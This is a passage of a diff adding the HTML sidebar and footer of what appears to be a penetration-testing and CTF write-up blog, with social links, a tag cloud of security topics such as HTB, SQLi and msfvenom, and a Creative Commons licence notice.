+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
